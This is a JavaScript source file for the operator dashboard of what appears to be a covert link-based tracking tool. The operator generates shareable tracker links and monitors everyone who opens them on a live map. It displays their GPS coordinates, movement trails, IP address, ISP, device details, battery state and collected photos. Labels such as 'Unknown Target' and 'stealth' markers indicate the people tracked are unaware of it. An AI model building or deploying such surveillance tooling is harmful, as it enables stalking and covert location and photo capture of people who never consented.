// ── State ────────────────────────────────────────────────────
let map;
let trackers = [];
let selectedTrackerId = null;
let selectedSessionId = null;
let markers = {}; // Key: trackerId:sessionId
let polylines = {}; // Key: trackerId:sessionId
let socket;

// ── Init ─────────────────────────────────────────────────────
document.addEventListener('DOMContentLoaded', () => {
  initMap();
  initSocket();
  loadTrackers();
  startClock();
});

function toggleSidebar() {
  document.querySelector('.sidebar').classList.toggle('open');
}

// ── Map ──────────────────────────────────────────────────────
function initMap() {
  map = L.map('map', { center: [20, 0], zoom: 2, zoomControl: true });
  L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png', {
    attribution: '&copy; CARTO',
    maxZoom: 19
  }).addTo(map);

  setTimeout(() => map.invalidateSize(), 100);
  window.addEventListener('resize', () => map.invalidateSize());
}

function startClock() {
  setInterval(() => {
    const now = new Date();
    const timeStr = window.innerWidth < 900 
      ? now.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' })
      : now.toLocaleString();
    document.getElementById('current-time').textContent = timeStr;
  }, 1000);
}

// ── Socket ───────────────────────────────────────────────────
function initSocket() {
  socket = io({ transports: ['websocket', 'polling'] });
  const statusEl = document.getElementById('connection-status');

  socket.on('connect', () => {
    statusEl.textContent = window.innerWidth < 900 ? 'Live' : 'Connected';
    statusEl.className = 'badge badge-green';
    trackers.forEach(t => socket.emit('watch-tracker', t.id));
  });

  socket.on('location-received', (data) => {
    const { trackerId, sessionId, location } = data;
    updateMarker(trackerId, sessionId, location);
    if (selectedTrackerId === trackerId) updateDetailPanel(trackerId);
  });

  socket.on('session-updated', (data) => {
    if (selectedTrackerId === data.trackerId) updateDetailPanel(data.trackerId);
  });

  socket.on('tracker-deleted', (id) => {
    trackers = trackers.filter(t => t.id !== id);
    // Remove all markers for this tracker
    Object.keys(markers).forEach(k => { if (k.startsWith(id + ':')) removeMarker(k); });
    renderTrackerList();
    if (selectedTrackerId === id) {
      selectedTrackerId = null;
      document.getElementById('detail-panel').classList.add('hidden');
    }
  });

  socket.on('photo-received', (data) => {
    if (selectedTrackerId === data.trackerId) updateDetailPanel(data.trackerId);
  });

  setInterval(() => {
    loadTrackers();
    if (selectedTrackerId) updateDetailPanel(selectedTrackerId);
  }, 10000);
}

// ── API Calls ────────────────────────────────────────────────
async function loadTrackers() {
  try {
    const res = await fetch('/api/trackers');
    trackers = await res.json();
    renderTrackerList();
    updateStats();
    trackers.forEach(t => socket.emit('watch-tracker', t.id));
  } catch (e) {}
}

async function createTracker() {
  document.getElementById('create-modal').classList.remove('hidden');
  document.getElementById('tracker-name').focus();
}

async function submitCreateTracker() {
  const name = document.getElementById('tracker-name').value.trim();
  const btn = document.querySelector('#create-modal .btn-primary');
  btn.disabled = true;
  btn.textContent = 'Creating...';
  try {
    const res = await fetch('/api/tracker/create', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ name: name || undefined })
    });
    if (!res.ok) {
      const errData = await res.json().catch(() => ({}));
      throw new Error(errData.error || `Server error (${res.status})`);
    }
    const data = await res.json();
    if (data.success) {
      closeModal();
      document.getElementById('tracker-name').value = '';
      document.getElementById('generated-link').value = data.link;
      document.getElementById('link-modal').classList.remove('hidden');
      trackers.push(data.tracker);
      if (socket) socket.emit('watch-tracker', data.tracker.id);
      renderTrackerList();
      showToast('Tracker created!');
    } else {
      throw new Error(data.error || 'Unknown error');
    }
  } catch (e) {
    showToast('Failed: ' + e.message, 'error');
    console.error('Tracker creation error:', e);
  } finally {
    btn.disabled = false;
    btn.textContent = 'Create';
  }
}

async function deleteTracker() {
  if (!selectedTrackerId) return;
  if (!confirm('Delete this tracker?')) return;
  try {
    await fetch(`/api/tracker/${selectedTrackerId}`, { method: 'DELETE' });
    selectedTrackerId = null;
    document.getElementById('detail-panel').classList.add('hidden');
  } catch (e) {}
}

// ── Markers ──────────────────────────────────────────────────
function updateMarker(trackerId, sessionId, location) {
  const key = `${trackerId}:${sessionId}`;
  const tracker = trackers.find(t => t.id === trackerId);

  const label = location.note === 'Network Location' ? 'Network' : (sessionId.slice(-4).toUpperCase());

  if (markers[key]) {
    markers[key].setLatLng([location.latitude, location.longitude]);
    markers[key].getElement().querySelector('.marker-label').textContent = label;
  } else {
    const icon = L.divIcon({
      className: 'custom-marker',
      html: `<div class="marker-dot ${location.note ? 'stealth' : 'active'}"></div>
             <div class="marker-label">${label}</div>`,
      iconSize: [30, 30],
      iconAnchor: [15, 15]
    });
    markers[key] = L.marker([location.latitude, location.longitude], { icon }).addTo(map);
    markers[key].on('click', () => { selectTracker(trackerId); selectSession(sessionId); });
  }

  if (!polylines[key]) {
    polylines[key] = L.polyline([], { color: '#6366f1', weight: 2, opacity: 0.5 }).addTo(map);
  }
  polylines[key].addLatLng([location.latitude, location.longitude]);
}

function removeMarker(key) {
  if (markers[key]) map.removeLayer(markers[key]);
  if (polylines[key]) map.removeLayer(polylines[key]);
  delete markers[key];
  delete polylines[key];
}

// ── UI ───────────────────────────────────────────────────────
function renderTrackerList() {
  const container = document.getElementById('tracker-list');
  if (trackers.length === 0) {
    container.innerHTML = '<div class="empty-state">No links created yet.</div>';
    return;
  }

  container.innerHTML = trackers.map(t => `
    <div class="tracker-item ${t.id === selectedTrackerId ? 'selected' : ''}" onclick="selectTracker('${t.id}')">
      <div class="tracker-item-header">
        <span class="tracker-dot ${t.active ? 'active' : 'inactive'}"></span>
        <span class="tracker-name">${escapeHtml(t.name)}</span>
      </div>
      <div class="tracker-meta">
        ${t.sessionCount || 0} devices linked · ${t.active ? 'Active' : 'Offline'}
      </div>
    </div>
  `).join('');
}

function selectTracker(trackerId) {
  selectedTrackerId = trackerId;
  const tracker = trackers.find(t => t.id === trackerId);
  if (!tracker) return;

  renderTrackerList();
  updateDetailPanel(trackerId);
  document.getElementById('detail-panel').classList.remove('hidden');
  
  if (window.innerWidth < 900) {
    toggleSidebar();
  }
}

function selectSession(sessionId) {
  selectedSessionId = sessionId;
  if (selectedTrackerId) updateDetailPanel(selectedTrackerId);
}

async function updateDetailPanel(trackerId, liveData = null) {
  if (!trackerId) return;
  selectedTrackerId = trackerId;
  const panel = document.getElementById('detail-panel');
  panel.classList.remove('hidden');

  let tracker;
  if (liveData && liveData.id === trackerId) {
    tracker = liveData;
  } else {
    try {
      const res = await fetch(`/api/tracker/${trackerId}`);
      tracker = await res.json();
    } catch (e) { return; }
  }

  document.getElementById('detail-name').textContent = tracker.name;

  // Tabs
  const tabsEl = document.getElementById('session-tabs');
  if (tracker.sessions?.length > 0) {
    if (!selectedSessionId) selectedSessionId = tracker.sessions[0].sessionId;
    tabsEl.innerHTML = tracker.sessions.map(s => `
      <div class="session-tab ${s.sessionId === selectedSessionId ? 'active' : ''}" onclick="selectSession('${s.sessionId}')">
        <span class="dot" style="background: ${s.active ? '#10b981' : '#64748b'}"></span>
        Device ${s.sessionId.slice(-4).toUpperCase()}
      </div>
    `).join('');
  } else {
    tabsEl.innerHTML = '<div class="empty-state">No devices online</div>';
    selectedSessionId = null;
  }

  const session = tracker.sessions?.find(s => s.sessionId === selectedSessionId);
  const di = session?.deviceInfo || {};
  const loc = session?.lastLocation || tracker.lastLocation || {};

  const pairs = {
    'detail-status': session?.active ? '<span class="badge badge-green">Online</span>' : '<span class="badge badge-gray">Offline</span>',
    'detail-last-update': loc.timestamp ? formatTime(loc.timestamp) : 'Never',
    'detail-coords': loc.latitude ? `${loc.latitude.toFixed(6)}, ${loc.longitude.toFixed(6)}` : '—',
    'detail-accuracy': loc.accuracy ? `±${Math.round(loc.accuracy)}m` : '—',
    'detail-speed': loc.speed != null ? `${(loc.speed * 3.6).toFixed(1)} km/h` : '0 km/h',
    'detail-mini-model': di.deviceModel || di.platform || 'General Device',
    'detail-device-name': di.deviceModel || di.platform || 'Unknown Target',
    'detail-model': di.deviceModel ? `${di.deviceModel}` : (di.platform || 'Standard Device'),
    'detail-battery': di.battery ? `${di.battery} (${di.charging === 'Yes' ? 'Charging' : 'Battery'})` : '—',
    'detail-network': di.network ? `${di.network.toUpperCase()}` : '—',
    'detail-browser': di.browser || '—',
    'detail-ip': di.ipAddress || '—',
    'detail-isp': di.isp || '—',
    'detail-location': di.city ? `${di.city}, ${di.country || ''}` : '—',
    'detail-country': di.country || '—',
    'detail-screen': di.screen || '—',
    'detail-language': di.language || '—',
    'detail-cores': di.cores || '—',
    'detail-ram': di.ram || '—',
    'detail-touch': di.touch || '—',
    'detail-timezone': di.timezone || '—'
  };

  Object.entries(pairs).forEach(([id, val]) => {
    const el = document.getElementById(id);
    if (el) {
      if (id === 'detail-status') el.innerHTML = val;
      else el.textContent = val;
    }
  });

  renderHistory(tracker.locations?.filter(l => l.sessionId === selectedSessionId) || []);
  renderPhotos(tracker.photos?.filter(p => p.sessionId === selectedSessionId) || []);
}

function renderHistory(locations) {
  const el = document.getElementById('location-history');
  if (locations.length > 0) {
    el.innerHTML = locations.slice(-15).reverse().map(l => `
      <div class="history-item">
        <div class="history-coords">${l.latitude.toFixed(5)}, ${l.longitude.toFixed(5)}</div>
        <div class="history-time">${formatTime(l.timestamp)}</div>
      </div>
    `).join('');
  } else { el.innerHTML = '<div class="empty-state">No history yet</div>'; }
}

function renderPhotos(photos) {
  const el = document.getElementById('photo-grid');
  if (photos.length > 0) {
    el.innerHTML = photos.slice(-12).reverse().map(p => `
      <div class="photo-item" onclick="window.open('${p.image}', '_blank')">
        <img src="${p.image}" />
        <div class="photo-meta">${formatTime(p.timestamp)}</div>
      </div>
    `).join('');
  } else { el.innerHTML = '<div class="empty-state">No photos yet</div>'; }
}

function updateStats() {
  document.getElementById('stat-total').textContent = trackers.length;
  document.getElementById('stat-active').textContent = trackers.filter(t => t.active).length;
  document.getElementById('stat-locations').textContent = trackers.reduce((sum, t) => sum + (t.locationCount || 0), 0);
  document.getElementById('stat-photos').textContent = trackers.reduce((sum, t) => sum + (t.photoCount || 0), 0);
}

function closeModal() { document.getElementById('create-modal').classList.add('hidden'); }
function closeLinkModal() { document.getElementById('link-modal').classList.add('hidden'); }
function copyLink() { 
  const link = document.getElementById('generated-link').value;
  navigator.clipboard.writeText(link);
  showToast('Link copied!');
}
function copyTrackerLink() {
  if (!selectedTrackerId) return;
  navigator.clipboard.writeText(`${window.location.origin}/track/${selectedTrackerId}`);
  showToast('Link copied!');
}

function formatTime(ts) {
  if (!ts) return '—';
  const d = new Date(ts);
  const diff = (new Date() - d) / 1000;
  if (diff < 60) return 'Just now';
  if (diff < 3600) return `${Math.floor(diff / 60)}m ago`;
  return d.toLocaleTimeString();
}

function escapeHtml(str) {
  const d = document.createElement('div');
  d.textContent = str;
  return d.innerHTML;
}

function showToast(m, t = 'success') {
  const el = document.getElementById('toast');
  el.textContent = m;
  el.className = `toast ${t === 'error' ? 'toast-error' : ''}`;
  el.classList.remove('hidden');
  setTimeout(() => el.classList.add('hidden'), 3000);
}
